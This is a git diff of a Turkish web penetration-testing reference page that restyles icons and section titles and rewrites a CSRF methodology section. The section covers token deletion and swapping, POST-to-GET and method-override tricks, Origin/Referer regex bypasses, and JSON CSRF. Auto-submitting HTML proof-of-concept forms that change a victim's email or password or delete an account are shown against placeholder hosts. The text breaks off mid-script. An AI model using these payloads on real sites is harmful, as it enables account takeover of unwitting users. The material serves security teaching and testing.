@@ -1139,6 +1139,16 @@
       mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2M7.5 15l-1.41-1.41L8.67 11l-2.58-2.58L7.5 7l4 4zm11.5 0h-8v-2h8z'/%3E%3C/svg%3E");
     }
 
+    .icon-enumeration::before {
+      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5A6.5 6.5 0 1 0 9.5 16a6.47 6.47 0 0 0 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5S14 7.01 14 9.5S11.99 14 9.5 14M7 9h5v1H7zm0 2h5v1H7zm0-4h5v1H7z'/%3E%3C/svg%3E");
+      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5A6.5 6.5 0 1 0 9.5 16a6.47 6.47 0 0 0 4.23-1.57l.27.28v.79l5 4.99L20.49 19zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5S14 7.01 14 9.5S11.99 14 9.5 14M7 9h5v1H7zm0 2h5v1H7zm0-4h5v1H7z'/%3E%3C/svg%3E");
+    }
+
+    .icon-exploitation::before {
+      -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M20 18c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2zM4 6h16v10H4zm6.2 2h1.6l-2.4 3.2L12 15h-1.6l2.4-3.2L10.4 8zM14 13h3v1h-3zm0-2h3v1h-3zm0-2h3v1h-3z'/%3E%3C/svg%3E");
+      mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M20 18c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2zM4 6h16v10H4zm6.2 2h1.6l-2.4 3.2L12 15h-1.6l2.4-3.2L10.4 8zM14 13h3v1h-3zm0-2h3v1h-3zm0-2h3v1h-3z'/%3E%3C/svg%3E");
+    }
+
     .icon-detective::before {
       -webkit-mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5C2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3C19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z'/%3E%3C/svg%3E");
       mask-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='currentColor' d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12c5.16-1.26 9-6.45 9-12V5l-9-4m0 10.9c-2.58 0-4.6-2.06-4.6-4.6c0-2.58 2.06-4.6 4.6-4.6c2.58 0 4.6 2.06 4.6 4.6c0 2.58-2.06 4.6-4.6 4.6'/%3E%3C/svg%3E");
@@ -1434,14 +1444,14 @@
         ]
       },
 
-      baslangic: {
+baslangic: {
         menuName: 'Giriş',
         icon: 'icon-network-node',
         title: 'Web Nasıl Çalışır? (How The Web Works)',
         description: 'Süslü tanımları unut. Bir URL\'e tıkladığında arka planda gerçekleşen nanosaniyelik olayların teknik anatomisi. Sızma testi, bu akıştaki kör noktaları bulma sanatıdır.',
         sections: [
           {
-            title: "🌐 1. DNS Çözümleme ve Altyapı Katmanı",
+            title: "1. DNS Çözümleme ve Altyapı Katmanı",
             content: `
               <p class="small">Bir URL tarayıcıya girildiğinde, uygulama katmanından ağ katmanına kadar bir dizi sorgu başlar. Bu süreçte güvenliği etkileyen en büyük faktör 'Güven Çizgisi'nin nerede başladığıdır.</p>
               <div class="card" style="border-left: 2px solid var(--accent);">
@@ -1467,7 +1477,7 @@
             `
           },
           {
-            title: "🔌 2. OSI ve TCP/IP Model Katmanları",
+            title: "2. OSI ve TCP/IP Model Katmanları",
             content: `
               <p class="small">DNS çözümlemesi bittikten sonra, veri paketleri hiyerarşik katmanlara göre işlenir.</p>
               
@@ -1491,7 +1501,7 @@
             `
           },
           {
-            title: "📡 3. TCP ve TLS El Sıkışması (Handshake)",
+            title: "3. TCP ve TLS El Sıkışması (Handshake)",
             content: `
               <p class="small">IP bulunduktan sonra ham veri gönderilemez. Önce güvenilir bir hat kurulmalıdır.</p>
               <div class="tool-io-grid">
@@ -1512,7 +1522,7 @@
             `
           },
           {
-            title: "📦 4. HTTP Protokolü: İstek ve Yanıt Anatomisi",
+            title: "4. HTTP Protokolü: İstek ve Yanıt Anatomisi",
             content: `
               <p class="small">Bağlantı kuruldu. Artık Web Sunucusu (Nginx/Apache) ve Tarayıcı konuşmaya başlar. HTTP "Stateless" (durumsuz) bir protokoldür.</p>
               <div class="card" style="border-left: 2px solid var(--accent);">
@@ -1536,7 +1546,7 @@
             `
           },
           {
-            title: "🍪 5. State Yönetimi: Cookie, Session ve Token",
+            title: "5. State Yönetimi: Cookie, Session ve Token",
             content: `
               <p class="small">HTTP stateless olduğu için kullanıcı kimliğini korumak üzere state yönetimi kullanılır.</p>
               <div class="card" style="border-left: 2px solid var(--secondary);">
@@ -1552,7 +1562,7 @@
             `
           },
           {
-            title: "⚙️ 6. Tarayıcı Motoru: DOM ve Rendering Pipeline",
+            title: "6. Tarayıcı Motoru: DOM ve Rendering Pipeline",
             content: `
               <p class="small">Sunucudan HTML metni geldiğinde iş bitmez, yeni başlar. Tarayıcı bu metni "Render" eder.</p>
               <div class="card" style="border-left: 2px solid var(--accent);">
@@ -1572,7 +1582,7 @@
             `
           },
           {
-            title: "⚡ 7. JavaScript Motoru ve Event Loop",
+            title: "7. JavaScript Motoru ve Event Loop",
             content: `
               <p class="small">JavaScript 'Single Threaded' (Tek iş parçacıklı) çalışır. Yani aynı anda sadece bir iş yapabilir. Bloklanmayı önlemek için Asenkron yapıdadır.</p>
               
@@ -1595,7 +1605,7 @@
             `
           },
           {
-            title: "🛡️ 8. Web Güvenlik Sınırları (The Boundary)",
+            title: "8. Web Güvenlik Sınırları (The Boundary)",
             content: `
               <p class="small">Web mimarisi, sitelerin birbirini yemesini engellemek için iki temel yasaya dayanır:</p>
               <div class="tool-grid-container">
@@ -1615,7 +1625,7 @@
             `
           },
           {
-            title: "📊 9. Web Performance ve Core Web Vitals",
+            title: "9. Web Performance ve Core Web Vitals",
             content: `
               <p class="small">Performans artık sadece hız değil, kullanıcı deneyimi metriğidir.</p>
               <div class="tool-io-grid">
@@ -1631,7 +1641,7 @@
             `
           },
           {
-            title: "🔄 10. Caching (Önbellek) Mekanizması",
+            title: "10. Caching (Önbellek) Mekanizması",
             content: `
               <p class="small">Sunucu yükünü azaltmak için veriler tarayıcıda, CDN'de veya Proxy'de saklanır. En sinsi zafiyetlerin olduğu yerdir.</p>
               <div class="card" style="border-left: 2px solid var(--secondary);">
@@ -1951,27 +1961,27 @@ Password: anything</pre>
         "icon": "icon-refresh",
         "parent": "vulnerabilities",
         "title": "CSRF - Cross-Site Request Forgery",
-        "description": "CSRF tokenı, SameSite politikaları, Referer/Origin bypass ve API CSRF zafiyetleri için metodoloji.",
+        "description": "Token silme, Method değiştirme (Swap), SameSite bypass ve JSON trickleri.",
         "sections": [
           {
-            "title": "Klasik CSRF & Aynı Kaynak Politikası (Same-Origin)",
-            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Tanım:</strong> Kurbanın tarayıcısını, izinsiz (POST/PUT/DELETE) işlem yapmaya zorlama. Başarı için kurbanın oturum çerezleri gerekir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Tespit:</strong> State-changing endpoint'i (örn: Adres Güncelleme) belirle. Bu isteği Burp'te yakalayıp, tokenı ve tüm kaynak başlıklarını kaldırarak test et.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>SameSite Kontrolü:</strong> Oturum çerezlerinin <code>SameSite=Lax</code> (varsayılan koruma) veya <code>SameSite=Strict</code> olup olmadığını kontrol et. <code>SameSite=Lax</code>, POST CSRF'yi engeller.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>PoC Notu:</strong> Klasik HTML form PoC'leri, güçlü <code>SameSite</code> veya <code>Referer</code> kontrolü nedeniyle genellikle başarısız olur. Bu, zafiyetin olmadığı anlamına gelmez!</li>\n\t\t\t</ul>"
+            "title": "1. Keşif & Method Trickleri",
+            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Hedefi Belirle:</strong> Şifre, mail değişimi veya silme işlemini yakala. İstekte sadece Cookie gidiyorsa ve token yoksa direkt yapıştır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>POST -> GET Çevirme:</strong> İsteği Burp'te <code>Change Request Method</code> ile GET'e çevir. Token parametresini silip yolla. Backend GET isteğinde token sormuyorsa sistem zaafiyetlidir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>SameSite Lax Bypass:</strong> Tarayıcı POST'u engeller ama GET'e izin verir. POST isteğini GET'e çevirirsen varsayılan <code>SameSite=Lax</code> korumasını delersin.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Method Override:</strong> GET yapınca hata mı verdi? URL sonuna <code>?_method=POST</code> ekleyip tekrar dene. Framework'ü kandırıp token kontrolünü atlatabilirsin.</li>\n\t\t\t</ul>"
           },
           {
-            "title": "Token Kontrol Zafiyetleri",
-            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Token Eksikliği:</strong> İstekten <code>authenticity_token</code>, <code>_xsrf</code>, vb. token parametresini tamamen kaldırıp isteği tekrar gönder. Başarılı olursa basit CSRF zafiyeti vardır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Token Tekrar Kullanımı (Re-use):</strong> Başarılı bir isteğin tokenını kopyala ve aynı kullanıcıyla farklı bir işlem için tekrar kullan. Token her kullanımda yenilenmiyorsa mantık hatasıdır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Token Kapsamı/Tahmin Edilebilirlik:</strong> Farklı bir kullanıcının tokenıyla veya tahmin edilebilir bir tokenla (ör: kullanıcı ID'si içeriyorsa) işlemi gerçekleştirmeyi dene.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Çift Gönderim Kontrolü (Double Submit):</strong> Uygulama, çerezdeki token ile isteğin gövdesindeki/başlığındaki tokenı eşleştirir. İstekteki token değerini rastgele bir şeyle değiştirip dene. Eğer kabul edilirse eşleştirme mantığı hatalıdır.</li>\n\t\t\t</ul>"
+            "title": "2. Token Bypass Yöntemleri",
+            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Parametreyi Sil:</strong> <code>csrf_token</code> parametresini komple sil. Backend \"parametre yoksa kontrol etme\" mantığındaysa geçer.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Değeri Boşalt (Empty Value):</strong> Parametre kalsın (`csrf_token=`) ama değerini sil. Backend sadece \"parametre gönderilmiş mi\" diye bakıp, içinin dolu olup olmadığını kontrol etmeyi unutmuş olabilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Token Swap (Değiş Tokuş):</strong> Kendi hesabının geçerli tokenını al, kurbanın isteğine koy. Sunucu \"Token geçerli mi?\" diye bakar ama \"Token bu adama mı ait?\" diye bakmazsa zafiyet vardır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Double Submit Bypass:</strong> Token hem Cookie hem Body'de mi gidiyor? İkisini de <code>hacked</code> yapıp yolla. Sunucu sadece \"iki değer eşit mi\" diye bakıyorsa bypass edersin.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Format Kontrolü:</strong> Token çok mu kısa? Sadece sayı mı? MD5 mi? Tahmin edilebilir veya kırılabilecek gibiyse brute-force dene.</li>\n\t\t\t</ul>"
           },
           {
-            "title": "Programatik Bypass: Referer/Origin Atlatma",
-            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Tanım:</strong> Token kontrolü olsa bile, sunucunun <code>Origin</code> ve <code>Referer</code> başlıklarını doğru kontrol etmemesi nedeniyle Burp/cURL gibi araçlarla atlatma.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Tespit:</strong> Geçerli çerezlerle yakalanan isteğin sadece <code>Origin</code> ve <code>Referer</code> başlıklarını <code>https://hacker.com</code> gibi harici bir adrese değiştir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Başarı Kanıtı:</strong> Sunucu <code>HTTP 302 Found</code> ile başarılı geri dönüş sayfasına yönlendiriyorsa (Login sayfasına değil), zafiyet kanıtlanmıştır. Bu, programatik araçlarla sömürülebilir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Ek Not:</strong> Aynı zafiyetin bulunduğu API'lerde, <code>X-Requested-With</code> başlığını silerek bypass etmeyi deneyin.</li>\n\t\t\t</ul>"
+            "title": "3. Header ve Referer Kandırma",
+            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Header'ı Sil:</strong> Referer/Origin headerlarını tamamen silip yolla. Bazı sistemler \"Header yoksa güvenlidir\" diyip geçirir.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Regex Bypass:</strong> Sistem <code>hedef.com</code> var mı diye mi bakıyor? <code>hedef.com.hacker.com</code> veya <code>hacker.com/hedef.com</code> yaparak regex'i kandır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Null Byte (%00):</strong> Origin'in sonuna <code>%00</code> atıp regex kontrolünü orada kesmeyi dene. Eski sistemlerde iş yapar.</li>\n\t\t\t</ul>"
           },
           {
-            "title": "Güvenli Olmayan Metot ve API CSRF",
-            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Metot İhlali:</strong> Adres silme/güncelleme gibi state-changing işlemlerin <code>POST/PUT/DELETE</code> yerine <code>GET</code> metoduyla yapılıp yapılmadığını kontrol et. (<code>GET</code> ile işlem yapılıyorsa büyük bir zafiyettir.)</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>JSON CSRF:</strong> API'nin JSON payload kabul edip etmediğini kontrol et. Kötü amaçlı formda <code>enctype=\"text/plain\"</code> kullanarak, sunucuyu form verisini JSON olarak ayrıştırmaya zorlamayı dene.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>CORS CSRF:</strong> API'nin <code>Access-Control-Allow-Origin: *</code> ve <code>Access-Control-Allow-Credentials: true</code> ayarlarına sahip olup olmadığını kontrol et. Bu, üçüncü taraf sitelerin XHR ile çerezli istek atmasını sağlar.</li>\n\t\t\t</ul>"
+            "title": "4. API & JSON CSRF",
+            "content": "<ul style=\"list-style:none;padding:0;margin:0;display:grid;gap:8px\">\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>Content-Type Spoofing:</strong> API JSON (<code>application/json</code>) bekliyor. Sen HTML form ile <code>text/plain</code> yolla ama body JSON olsun. Backend header'a bakmadan parse ederse zaafiyet kanıtlanır.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>CORS Hataları:</strong> API <code>Origin: null</code> kabul ediyor mu? İsteği <code>iframe sandbox</code> içinden atarak Origin'i null yap ve korumayı aş.</li>\n\t\t\t\t<li style=\"background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px\"><strong>XSS ile CSRF Zinciri:</strong> Token var ve geçemiyor musun? XSS bulduysan token'ı okut, JS ile (fetch) isteği yapıştır. XSS varsa CSRF koruması çöp olur.</li>\n\t\t\t</ul>"
           },
           {
             "title": "Örnek CSRF Senaryoları",
-            "content": "<ul style='list-style:none;padding:0;margin:0;display:grid;gap:8px'>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 1 - Temel Token Eksikliği (POST)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, kritik bir POST isteğinde CSRF token kontrolü yapmıyor.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /user/change_email HTTP/1.1\nCookie: session=abc...\n\nemail=hacker@mail.com&csrf_token=XXX</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/user/change_email\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"hacker@mail.com\" /&gt;\n      &lt;!-- Token KALDIRILDI --&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 2 - Token Kısıtlaması Yok</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu, gönderilen tokenın oturum çerezi ile ilişkilendirilip ilişkilendirilmediğini (yani tokenın kurbana ait olup olmadığını) kontrol etmiyor.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi hesabına giriş yapar ve kendi <code>csrf_token</code> değerini kaydeder. (Örn: <code>hacker_token</code>)<br>2. Saldırgan, bu <code>hacker_token</code> değerini kurbanı hedef alan PoC formuna yerleştirir.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/change_pass\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"new_password\" value=\"hacked123\" /&gt;\n      &lt;!-- Token olarak saldırganın tokenı kullanılıyor --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 3 - Referer Başlık Kontrolü Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Referer</code> başlığında sadece ana domainin (<code>victim.com</code>) geçip geçmediğini kontrol ediyor, subdomainleri dikkate almıyor.<br><div style='margin-top:10px;'><strong>Saldırgan Yöntemi:</strong> <code>https://victim.com.hacker.com/exploit.html</code> veya <code>https://hacker.com/exploit.html?referrer=https://victim.com</code> gibi teknikler denenir.<br>Bu örnekte, <code>.victim.com</code> tekniğini kullanalım. Saldırgan, <code>victim.com</code> ile biten bir subdomain oluşturur: <code>https://hacker-site.victim.com/poc.html</code></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Adresi:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>https://hacker-site.victim.com/poc.html</pre><strong style='margin-top:10px;display:block;'>Sonuç:</strong><div style='margin-top:5px;'>Sunucu <code>Referer</code> başlığına bakar ve <code>hacker-site.victim.com</code> adresini <code>victim.com</code>'a ait olarak yanlış yorumlayabilir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 4 - Zafiyetli Metot Kullanımı (GET ile Hesap Silme)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik bir 'state-changing' işlem (hesap silme) için <code>POST</code> yerine <code>GET</code> metodu kullanılıyor. Bu, bir <code>&lt;img&gt;</code> veya <code>&lt;a&gt;</code> etiketi ile sömürülebilir.<br><div style='margin-top:10px;'><strong>Orijinal İstek:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>GET /user/delete?id=123&confirm=true HTTP/1.1\nCookie: session=abc...</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (En Basit Yöntem):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;img src=\"https://victim.com/user/delete?id=123&confirm=true\" style=\"display:none\"&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Kurbanın tarayıcısı, resmi yüklemeye çalışırken oturum çerezlerini de göndererek hesap silme isteğini tetikler.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 5 - JSON CSRF (text/plain Yöntemi)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> API, <code>application/json</code> yerine <code>text/plain</code> olarak gönderilen JSON verilerini kabul ediyor ve <code>X-Requested-With</code> kontrolü yok.<br><div style='margin-top:10px;'><strong>Orijinal İstek (JSON):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /api/settings HTTP/1.1\nContent-Type: application/json\n\n{\"username\":\"new_name\"}</pre></div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;form action=\"https://victim.com/api/settings\" method=\"POST\" enctype=\"text/plain\"&gt;\n  &lt;input type=\"hidden\" name='{\"username\":\"hacked\"}' value='\"}' /&gt;\n  &lt;!-- Tarayıcı payload'ı şu şekilde kodlar: {'username':'hacked'}='}' --&gt;\n&lt;/form&gt;</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucu eğer akıllıca ayrıştırma yapmazsa, form verisini, geçerli bir JSON payload'ı olarak yorumlayabilir.</div></div></details></li>\n\n<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 6 - Double Submit Cookie CSRF Bypass</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Uygulama, isteğin gövdesindeki/başlığındaki token ile çerezdeki tokenı eşleştirir. Ancak tokenı tekrar oluşturma (set etme) fonksiyonu zafiyetlidir.<br><div style='margin-top:10px;'><strong>Saldırı Adımları:</strong><br>1. Saldırgan, kendi CSRF tokenını çerez olarak kurbana enjekte eder (Örn: XSS, XSS olmayan bir domainde zafiyetli bir çerez koyma, vb.).<br>2. Saldırgan, bu enjekte ettiği token değerini (Örn: <code>hacker_cookie_token</code>) PoC formuna koyar.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu:</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;html&gt;\n  &lt;!-- Daha önce XSS ile 'csrf_token' çerezi enjekte edilmiş varsayılır --&gt;\n  &lt;body onload=\"document.forms[0].submit()\"&gt;\n    &lt;form action=\"https://victim.com/update_info\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"data\" value=\"hacked_data\" /&gt;\n      &lt;!-- Formdaki token, çerezdeki enjekte edilen token ile eşleşir --&gt;\n      &lt;input type=\"hidden\" name=\"csrf_token\" value=\"hacker_cookie_token\" /&gt;\n    &lt;/form&gt;\n  &lt;/body&gt;\n&lt;/html&gt;</pre></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 7 - Origin Kontrolü Bypass (Null Byte veya Port Kullanımı)</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Sunucu <code>Origin</code> başlığını regex ile kontrol ederken sonundaki port numarasını veya dizenin sonunu tam olarak kontrol etmez.<br><div style='margin-top:10px;'><strong>Saldırı Yöntemleri:</strong><br>1. Port Bypass: Saldırgan, <code>https://victim.com:8080.hacker.com</code> gibi bir URL kullanır. (Çoğu tarayıcı <code>Origin</code>'i sadece <code>https://victim.com</code> olarak gönderir, ancak bazı sunucular yanlış kontrol edebilir.)<br>2. Boş Byte: <code>Referer</code> veya <code>Origin</code> başlığına Null Byte (<code>%00</code>) eklenerek regex kontrolünün yanlış sonuç vermesi sağlanır.</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) İsteği (Boş Byte Örneği):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>POST /admin/action HTTP/1.1\nOrigin: https://victim.com%00.hacker.com</pre><strong style='margin-top:10px;display:block;'>Açıklama:</strong><div style='margin-top:5px;'>Sunucunun regex'i <code>victim.com</code>'dan sonraki kısmı kontrol etmezse veya <code>%00</code>'da keserse bypass gerçekleşir.</div></div></details></li>\n\t\t\t\t<li style='background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:var(--muted);font-size:14px'><details><summary style='cursor:pointer;font-weight:bold;'>Senaryo 8 - Güvenli Olmayan HTML Tag'leri ile GET CSRF</summary><div style='margin-top:10px;'><strong>Zafiyet:</strong> Kritik işlem <code>GET</code> metoduyla yapılıyor ve <code>Referer</code>/<code>Origin</code> kontrolü yok. <br><div style='margin-top:10px;'><strong>PoC İçin Kullanılabilecek Diğer Tag'ler:</strong><br>1. &lt;script src='...'&gt;: (API'lerde, yanıt tipi JS ise ve side-effect yaratıyorsa kullanılır.)<br>2. &lt;link href='...'&gt;: (Bazı tarayıcılar tarafından prefetch/prerender amacıyla tetiklenebilir.)<br>3. &lt;iframe src='...'&gt;: (Eski tarayıcılarda veya özel konfigürasyonlarda tetiklenebilir.)</div><strong style='margin-top:10px;display:block;'>PoC (Saldırı) Kodu (AJAX/Fetch Kullanımı):</strong><pre style='margin:0;white-space:pre-wrap;padding:8px;border-radius:6px;background:rgba(0,0,0,0.2);margin-top:5px;'>&lt;script&gt;\n// API çerezleri ile kimlik doğrulaması yapıyorsa ve CORS 